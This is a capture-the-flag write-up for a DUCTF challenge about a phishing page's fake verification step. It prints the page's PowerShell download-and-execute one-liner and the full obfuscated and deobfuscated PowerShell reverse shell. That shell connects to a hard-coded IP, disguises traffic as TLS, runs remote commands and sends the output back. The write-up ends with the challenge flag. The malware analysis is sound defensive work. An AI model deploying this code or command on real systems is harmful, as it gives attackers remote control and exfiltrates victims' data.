# **Challenge:** Fishy Website

**Description:**\
Dear TodayMoon8357,\
\
Found this fishy website URL on my e-mail and it started to do some crazy stuff on my computer. I have captured some network traffic that may help you find out what is happening on my computer. Thanks a lot for the help!\
\
Regards,\
k3ng\
**Attachments:** capture.pcapng\
**Links:** [Site no longer active, only screenshots available]

**Solution:**
The context of this challenge describes the aftermath of a user having clicked on a suspicious link. They have given us the link to the website as well as a network traffic capture of the event. 

<p align="center"><img width="1600" height="679" alt="image" src="https://github.com/user-attachments/assets/9718c000-010d-4e95-9d9b-b84068cecd49" /></p>

The capture is overwhelming with information, most of which is not related to the weird activity. We don't know when the attack started or ended. Thankfully, the provided web link allows us to investigate this situation further.

<p align="center"><img width="814" height="525" alt="image" src="https://github.com/user-attachments/assets/4fe2135a-504f-4c9b-9cef-7105e1b54b73" /></p>

The website hosts a quick login page. We don't have credentials for a valid user on the site, but as it turns out, none are needed. A random login entry redirects us to this "validation" page with questionable instructions.

<p align="center"><img width="520" height="417" alt="image" src="https://github.com/user-attachments/assets/28ac0cb1-9e5b-4b54-8af9-80c53d264c5e" /></p>

Command
```powershell
powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('https://misc-fishy-website-a409b2d62edf.2025.ductf.net/verify/script')"
```

Keywords such as "Net.WebClient" and "DownloadString" as well as a Google search for "powershell iex" indicate that these are instructions to download a script and execute it. This script is likely installing malicious programs onto the system. We can confirm that by downloading the script's source code (but not executing it). 

<p align="center"><img width="1339" height="498" alt="image" src="https://github.com/user-attachments/assets/a49cf219-8f5b-45cc-bf3b-0e57d69a050d" /></p>

The script file contains yet another command that decodes the text from Base64 (Google "powershell encodedcommand parameter syntax") to UTF-16 (PowerShell works in UTF-16LE). When converted, it becomes an obfuscated PowerShell script.

```powershell
               $BBB88B8B888BBB88 = 0xf1,
                  0x6e,
    0xcd,
 0xc6,0x79,0x4c,0x66,0xd1,0x02,
          0xf8,0x33,0xc4,0x86,
                 0xe7,0xa4,
                      0x35,0x8d,
  0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,
     0x0b,0x9e,0x53,
    0xa4,0xd3
  function IIlIlIlIllIIllIl {
     param([int[]]$BBBB8888BBBBB8BB, [int]$BB8BB8B8BBB8B8B8)
                    $B8B8B8B8B8B8B8BB = ""
             foreach ($B888BB88888BBBBB in $BBBB8888BBBBB8BB) {
                        $B8B8B8B8B8B8B8BB += [char]($B888BB88888BBBBB -bxor $BB8BB8B8BBB8B8B8)
           }
                         return $B8B8B8B8B8B8B8BB
                  }
    function lIIIlllIIIIllllI {
     param (
                         [byte[]]$B8BBB8B8BB8BBB88,
                 [byte[]]$BBB8BBB8B88B88B8
        )
                 $BBB88BB88BB8BBB8 = 0..255
                 $B888B8BB888BB88B = 0
           for ($B8BB8BBB8BB8BBBB = 0; $B8BB8BBB8BB8BBBB -lt 256; $B8BB8BBB8BB8BBBB++) {
                           $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $B8BBB8B8BB8BBB88[$B8BB8BBB8BB8BBBB % $B8BBB8B8BB8BBB88.Length]) % 256
                             $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
     }
                     $B8BB8BBB8BB8BBBB = 0
                    $B888B8BB888BB88B = 0
                        $BBBBB8BBB8BBB88B = @()
           foreach ($BBBB88888B888BBB in $BBB8BBB8B88B88B8) {
                             $B8BB8BBB8BB8BBBB = ($B8BB8BBB8BB8BBBB + 1) % 256
                              $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]) % 256
                            $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
                        $B88BBB888BBB88B8 = $BBB88BB88BB8BBB8[($BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $BBB88BB88BB8BBB8[$B888B8BB888BB88B]) % 256]
                       $BBBBB8BBB8BBB88B += ($BBBB88888B888BBB -bxor $B88BBB888BBB88B8)
          }
             return ,$BBBBB8BBB8BBB88B
                }
    function lllIIlIIlIllllll {
                  param ([string]$B888BBBBB8B8B8BB)
              $B888B8B8B88B8BB8 = [System.Text.Encoding]::UTF8.GetBytes($B888BBBBB8B8B8BB)
                   $BBBB8888BBBBB8BB = (lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $B888B8B8B88B8BB8) + (0x02,0x04,0x06,0x08)
                     $B88BBBBBB888888B = [System.BitConverter]::GetBytes([int16]$BBBB8888BBBBB8BB.Length)
        [Array]::Reverse($B88BBBBBB888888B)
       return (0x17, 0x03, 0x03) + $B88BBBBBB888888B + $BBBB8888BBBBB8BB
                }
             function llIIlllllIIIlllI {
                 $B88B888B8888B888 = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) -BB8BB8B8BBB8B8B8 222)
          $BBBB8B8BB888B88B = [System.Text.Encoding]::ASCII.GetBytes($B88B888B8888B888)
            $BB88BBBB88B8888B = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBBB8B8BB888B88B.Length))
                          [Array]::Reverse($BB88BBBB88B8888B)
                       $B88888B888888BB8 = @(0x00) + $BB88BBBB88B8888B + $BBBB8B8BB888B88B
                   $BB8BBBB8B8888BB8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$B88888B888888BB8.Length))
                       [Array]::Reverse($BB8BBBB8B8888BB8)
         $B8888B88BB888B88 = $BB8BBBB8B8888BB8 + $B88888B888888BB8
              $B888B888BBB8B8BB = [byte[]] ([BitConverter]::GetBytes([UInt16]$B8888B88BB888B88.Length))
        [Array]::Reverse($B888B888BBB8B8BB)
                     $B8BB88BBBB8B88B8 = @(0x00,
                0x00) + $B888B888BBB8B8BB + $B8888B88BB888B88
                 $BBBB88B8BB88B88B = @(0x00, 0x0b,0x00,0x04,0x03,0x00,0x01,0x02,
                                 0x00,0x0a,0x00,0x16,0x00,0x14,0x00,0x1d,0x00,0x17,0x00,0x1e,0x00,0x19,0x00,0x18,0x01,0x00,0x01,0x01,0x01,0x02,0x01,0x03,0x01,0x04,
                                            0x00,0x23,0x00,0x00,
                              0x00,0x16,0x00,0x00,
                                      0x00,0x17,0x00,0x00,
                                    0x00,0x0d,0x00,0x1e,0x00,0x1c,0x04,0x03,0x05,0x03,0x06,0x03,0x08,0x07,0x08,0x08,0x08,0x09,0x08,0x0a,0x08,0x0b,0x08,0x04,0x08,0x05,0x08,0x06,0x04,0x01,0x05,0x01,0x06,0x01,
                                      0x00,0x2b,0x00,0x03,0x02,0x03,0x04,
                             0x00,0x2d,0x00,0x02,0x01,0x01,
                                   0x00,0x33,0x00,0x26,0x00,0x24,0x00,0x1d,0x00,0x20,
                          0x35,0x80,0x72,0xd6,0x36,0x58,0x80,0xd1,0xae,0xea,0x32,0x9a,0xdf,0x91,0x21,0x38,0x38,0x51,0xed,0x21,0xa2,0x8e,0x3b,0x75,0xe9,0x65,0xd0,0xd2,0xcd,0x16,0x62,0x54)
           $BB88BB8BB88BB88B = $B8BB88BBBB8B88B8 + $BBBB88B8BB88B88B
          $BBBB8B88888888B8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$BB88BB8BB88BB88B.Length))
         [Array]::Reverse($BBBB8B88888888B8)
     $B8888BBB888B8888 = @(0x03,0x03,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,
                        0x0d,0x0e,0x0f,
               0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
                        0x18,
               0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0xe0,0xe1,
                   0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
                     0xfb,0xfc,0xfd,0xfe,0xff,0x00,0x08,0x13,0x02,0x13,0x03,0x13,0x01,0x00,0xff,0x01,0x00)
          $BB8B8BBBB88B8B8B = $B8888BBB888B8888 + $BBBB8B88888888B8 + $BB88BB8BB88BB88B
             $BB8BBB88B8B8B888 = [byte[]] ([BitConverter]::GetBytes($BB8B8BBBB88B8B8B.Length))
        [Array]::Reverse($BB8BBB88B8B8B888)
     $BBB88BBB888B8B8B = @(0x01) + $BB8BBB88B8B8B888[1..3] + $BB8B8BBBB88B8B8B
        $B88B888B8BB8BBBB = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBB88BBB888B8B8B.Length))
         [Array]::Reverse($B88B888B8BB8BBBB)
                      $BBB888888BB88B88 = @(0x16,
                   0x03, 0x01) + $B88B888B8BB8BBBB + $BBB88BBB888B8B8B
       return ,$BBB888888BB88B88
                 }
 $BBBB8BBBBBB8B88B = New-Object System.Net.Sockets.TcpClient
                    $BBBB8BBBBBB8B88B.Connect((IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(5,7,25,2,25,3,15,25,5,7,7) -BB8BB8B8BBB8B8B8 55), ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49))
      $BBBB888888B88BBB = $BBBB8BBBBBB8B88B.GetStream()
 $BB88888BB8B8B8BB = llIIlllllIIIlllI
        $BBBB888888B88BBB.Write($BB88888BB8B8B8BB, 0, $BB88888BB8B8B8BB.Length)
        $B8B888BB8B8888BB = New-Object byte[] 16384
          $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, $B8B888BB8B8888BB.Length) | Out-Null
                  while ($true) {
              $B8B888BB8B8888BB = New-Object byte[] 16384
      try {
                     $B888BBB8B8B88B8B = $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, 16384)
                 } catch {
                    break
              }
                        $BBBB8888BBBBB8BB = $B8B888BB8B8888BB[5..($B888BBB8B8B88B8B - 1)]
                $B8B88B8BB888BBB8 = [System.Text.Encoding]::UTF8.GetString((lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $BBBB8888BBBBB8BB))
                         if ($B8B88B8BB888BBB8 -eq (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(109,112,97,124) -BB8BB8B8BBB8B8B8 8)) { break }
                      try {
                             $BB88B8B8BBBB888B = (Invoke-Expression $B8B88B8BB888BBB8 2>&1) | Out-String
                      } catch {
                   $BB88B8B8BBBB888B = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(186,141,141,144,141) -BB8BB8B8BBB8B8B8 255)
      }
          $BBBB8BB88BB888B8 = lllIIlIIlIllllll -B888BBBBB8B8B8BB $BB88B8B8BBBB888B.Trim()
                       $BBBB888888B88BBB.Write($BBBB8BB88BB888B8, 0, $BBBB8BB88BB888B8.Length)
            }
              $BBBB888888B88BBB.Close()
                $BBBB8BBBBBB8B88B.Close()
```

Thankfully, there are PowerShell deobfuscators online, made to replace a confusing series of characters with more unique names. For this, I asked Google's Gemini to help sort the labels. Here is the same snippet, now unscrambled:

```powershell
# Original: $BBB88B8B888BBB88
$Rc4EncryptionKey = 0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4, 0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 0xa4, 0xd3

# Original: function IIlIlIlIllIIllIl
function DecryptXorString {
    param(
        [int[]]$EncryptedIntArray, # Original: $BBBB8888BBBBB8BB
        [int]$XorKey # Original: $BB8BB8B8BBB8B8B8
    )
    $DecryptedString = "" # Original: $B8B8B8B8B8B8B8BB
    foreach ($EncryptedInt in $EncryptedIntArray) { # Original: $B888BB88888BBBBB
        $DecryptedString += [char]($EncryptedInt -bxor $XorKey)
    }
    return $DecryptedString
}

# Original: function lIIIlllIIIIllllI
function RC4DecryptEncrypt {
    param (	
        [byte[]]$Rc4Key, # Original: $B8BBB8B8BB8BBB88
        [byte[]]$InputDataBytes # Original: $BBB8BBB8B88B88B8
    )
    $Sbox = 0..255 # Original: $BBB88BB88BB8BBB8
    $J = 0 # Original: $B888B8BB888BB88B

    # KSA (Key-Scheduling Algorithm)
    for ($I = 0; $I -lt 256; $I++) { # Original: $B8BB8BBB8BB8BBBB
        $J = ($J + $Sbox[$I] + $Rc4Key[$I % $Rc4Key.Length]) % 256
        $Sbox[$I], $Sbox[$J] = $Sbox[$J], $Sbox[$I] # Swap
    }

    # PRGA (Pseudo-Random Generation Algorithm)
    $I = 0 # Original: $B8BB8BBB8BB8BBBB
    $J = 0 # Original: $B888B8BB888BB88B
    $OutputBytes = @() # Original: $BBBBB8BBB8BBB88B

    foreach ($ByteToProcess in $InputDataBytes) { # Original: $BBBB88888B888BBB
        $I = ($I + 1) % 256
        $J = ($J + $Sbox[$I]) % 256
        $Sbox[$I], $Sbox[$J] = $Sbox[$J], $Sbox[$I] # Swap
        $KeystreamByte = $Sbox[($Sbox[$I] + $Sbox[$J]) % 256] # Original: $B88BBB888BBB88B8
        $OutputBytes += ($ByteToProcess -bxor $KeystreamByte)
    }

    return, $OutputBytes
}

# Original: function lllIIlIIlIllllll
function PrepareTlsAppData {
    param ([string]$CommandOutputString) # Original: $B888BBBBB8B8B8BB
    $Utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($CommandOutputString) # Original: $B888B8B8B88B8BB8
    $EncryptedOutput = (RC4DecryptEncrypt -Rc4Key $Rc4EncryptionKey -InputDataBytes $Utf8Bytes) + (0x02, 0x04, 0x06, 0x08) # Original: $BBBB8888BBBBB8BB
    $OutputLengthBytes = [System.BitConverter]::GetBytes([int16]$EncryptedOutput.Length) # Original: $B88BBBBBB888888B
    [Array]::Reverse($OutputLengthBytes)
    return (0x17, 0x03, 0x03) + $OutputLengthBytes + $EncryptedOutput
}

# Original: function llIIlllllIIIlllI
function BuildTlsClientHello {
    # Original: $B88B888B8888B888
    $DecryptedDomain = (DecryptXorString -EncryptedIntArray @(168, 187, 172, 183, 184, 167, 240, 186, 171, 169, 176, 177, 176, 186, 187, 172, 240, 189, 177, 179) -XorKey 222)
	# creates: verify.duwnonder.com
    # Original: $BBBB8B8BB888B88B
    $DomainBytes = [System.Text.Encoding]::ASCII.GetBytes($DecryptedDomain)
    # Original: $BB88BBBB88B8888B
    $DomainLengthBytes = [byte[]] ([BitConverter]::GetBytes([UInt16]$DomainBytes.Length))
    [Array]::Reverse($DomainLengthBytes)

    # Original: $B88888B888888BB8
    $ServerNameExtension = @(0x00) + $DomainLengthBytes + $DomainBytes
    # Original: $BB8BBBB8B8888BB8
    $ServerNameExtensionLength = [byte[]] ([BitConverter]::GetBytes([UInt16]$ServerNameExtension.Length))
    [Array]::Reverse($ServerNameExtensionLength)

    # Original: $B8888B88BB888B88
    $TlsExtensionData = $ServerNameExtensionLength + $ServerNameExtension
    # Original: $B888B888BBB8B8BB
    $TlsExtensionDataLength = [byte[]] ([BitConverter]::GetBytes([UInt16]$TlsExtensionData.Length))
    [Array]::Reverse($TlsExtensionDataLength)

    # Original: $B8BB88BBBB8B88B8
    $ClientHelloExtensions = @(0x00, 0x00) + $TlsExtensionDataLength + $TlsExtensionData
    # Original: $BBBB88B8BB88B88B - This seems to be the main bulk of the Client Hello bytes
    $ClientHelloFixedBytes = @(0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e, 0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02, 0x01, 0x03, 0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x1e, 0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07, 0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04, 0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01, 0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00, 0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20, 0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80, 0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38, 0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0, 0xd2, 0xcd, 0x16, 0x62, 0x54)
    # Original: $BB88BB8BB88BB88B
    $FullClientHello = $ClientHelloExtensions + $ClientHelloFixedBytes
    # Original: $BBBB8B88888888B8
    $ClientHelloLengthBytes = [byte[]] ([BitConverter]::GetBytes([UInt16]$FullClientHello.Length))
    [Array]::Reverse($ClientHelloLengthBytes)

    # Original: $B8888BBB888B8888 - this looks like a TLS Handshake Header for ClientHello
    $TlsHandshakeHeader = @(0x03, 0x03, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00)
    # Original: $BB8B8BBBB88B8B8B
    $ClientHelloPacket = $TlsHandshakeHeader + $ClientHelloLengthBytes + $FullClientHello
    # Original: $BB8BBB88B8B8B888
    $OverallPacketLengthBytes = [byte[]] ([BitConverter]::GetBytes($ClientHelloPacket.Length))
    [Array]::Reverse($OverallPacketLengthBytes)

    # Original: $BBB88BBB888B8B8B
    $ApplicationDataRecord = @(0x01) + $OverallPacketLengthBytes[1..3] + $ClientHelloPacket
    # Original: $B88B888B8BB8BBBB
    $RecordLengthBytes = [byte[]] ([BitConverter]::GetBytes([UInt16]$ApplicationDataRecord.Length))
    [Array]::Reverse($RecordLengthBytes)

    # Original: $BBB888888BB88B88
    $FinalTlsRecord = @(0x16, 0x03, 0x01) + $RecordLengthBytes + $ApplicationDataRecord
    return, $FinalTlsRecord
}


# Main execution flow (deobfuscated)
$TcpClient = New-Object System.Net.Sockets.TcpClient # Original: $BBBB8BBBBBB8B88B

# Calculate target IP/hostname and port
$TargetHost = (DecryptXorString -EncryptedIntArray @(5, 7, 25, 2, 25, 3, 15, 25, 5, 7, 7) -XorKey 55) # Original: (IIlIlIlIllIIllIl - BBBB8888BBBBB8BB @(5, 7, 25, 2, 25, 3, 15, 25, 5, 7, 7) - BB8BB8B8BBB8B8B8 55)
# Creates 20.5.48.200
$TargetPort = ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49) # Calculates to 443
$TcpClient.Connect($TargetHost, $TargetPort)

$NetworkStream = $TcpClient.GetStream() # Original: $BBBB888888B88BBB

$InitialClientHelloPacket = BuildTlsClientHello # Original: $BB88888BB8B8B8BB
$NetworkStream.Write($InitialClientHelloPacket, 0, $InitialClientHelloPacket.Length)

$InitialReadBuffer = New-Object byte[] 16384 # Original: $B8B888BB8B8888BB
$NetworkStream.Read($InitialReadBuffer, 0, $InitialReadBuffer.Length) | Out-Null # Discard initial server response (part of TLS handshake)

while ($true) {
    $CommandReadBuffer = New-Object byte[] 16384 # Original: $B8B888BB8B8888BB
    try {
        $BytesRead = $NetworkStream.Read($CommandReadBuffer, 0, 16384) # Original: $B888BBB8B8B88B8B
    } catch {
        break # Exit loop on read error (e.g., connection closed)
    }

    # Strip TLS application data header (5 bytes: 17 03 03 Length)
    $EncryptedCommandBytes = $CommandReadBuffer[5..($BytesRead - 1)] # Original: $BBBB8888BBBBB8BB

    # Decrypt the received command
    $DecryptedCommand = [System.Text.Encoding]::UTF8.GetString((RC4DecryptEncrypt -Rc4Key $Rc4EncryptionKey -InputDataBytes $EncryptedCommandBytes)) # Original: $B8B88B8BB888BBB8

    # Check for exit command (decrypted: "mpaw" - likely "exit" or similar from attacker)
    if ($DecryptedCommand -eq (DecryptXorString -EncryptedIntArray @(109, 112, 97, 124) -XorKey 8)) {
        break # Exit loop if exit command received
    }

    $CommandOutput = "" # Original: $BB88B8B8BBBB888B
    try {
        # Execute the decrypted command and capture output
        $CommandOutput = (Invoke-Expression $DecryptedCommand 2>&1) | Out-String
    } catch {
        # Handle execution error with a generic error message (decrypted: "Error")
        $CommandOutput = (DecryptXorString -EncryptedIntArray @(186, 141, 141, 144, 141) -XorKey 255)
    }

    # Prepare command output for sending back to attacker (encrypt + TLS-like formatting)
    $ResponsePacket = PrepareTlsAppData -CommandOutputString $CommandOutput.Trim() # Original: $BBBB8BB88BB888B8
    $NetworkStream.Write($ResponsePacket, 0, $ResponsePacket.Length)
}

$NetworkStream.Close()
$TcpClient.Close()
```

Gemini also recognized a lot of familiar byte sequences and assigned accommodating names to each, including:
 - RC4 Encryption/Decryption Function (based on algorithms)
     - The function contained the encryption/decryption key
 - TLS "Builder" Function (based on specific byte sequences)
     - The function mimics a TLS packet to mask the exfiltrated data
 - Target Host/Port Variables (based on "TcpClient.connect(HOST, PORT)" call)

Based on the code's functions, the program will contact the home server and await the attacker's commands, then respond with the command outputs — a Command and Control attack. 

With this in mind, I can finally filter out network traffic and see what was exfiltrated. 
 - Traffic of interest: packets involved in the communication with the home server
     - Add IP filter for 20.5.48.200
 - Traffic of interest: packets marked TLS/SSL (implied from the TLS "Builder")
     - Add protocol filter for TLS

<p align="center"><img width="833" height="328" alt="image" src="https://github.com/user-attachments/assets/ca1477d5-47b7-4184-a4a2-ce9b44c98d02" /></p>

Now, we can decrypt the hidden messages from these fake TLS packets.

The last packet sent from the victim's computer contained this document.

<p>
<table width="100%">
  <tr>
    <th width="25%">Step</th>
    <th>Data</th>
  </tr>
  <tr>
    <td>Start</td>
    <td>4b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f6<br>
29d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018<br>
ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601<br>
073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef<br>
04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea70238<br>
90b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48<br>
daa2</td>
  </tr>
  <tr>
    <td>1 - RC4 Decrypt</td>
    <td>H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/5<br>
qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfj<br>
T0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA<br>
==</td>
  </tr>
  <tr>
    <td>2 - Base64 Decode (Hex for visibility)</td>
    <td>1f8b0800000000000003edce310ac2401484e1d49e222790b779bbf1008a958568ac17<br>
598d856091ec8241bcbb8b20887dd4e2ff9a816966cec7a19fc66b2c4624596ded33b3<br>
cf14715a1827aab5565269ee673657a58c79ea25f571df95e537a6fed162376f9637e3<br>
4f499df383241fecc51f346c8675e39bd5d6c7ceb6ad09f7c9afaf0200000000000000<br>
000000000000de3c00bdbb0f2f00280000<br></td>
  </tr>
  <tr>
    <td>3 - Gunzip Decompress (Identifying Gunzip Magic Bytes 1f 8b)</td>
    <td>DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}</td>
  </tr>
</table>
</p>

**Flag:** DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}
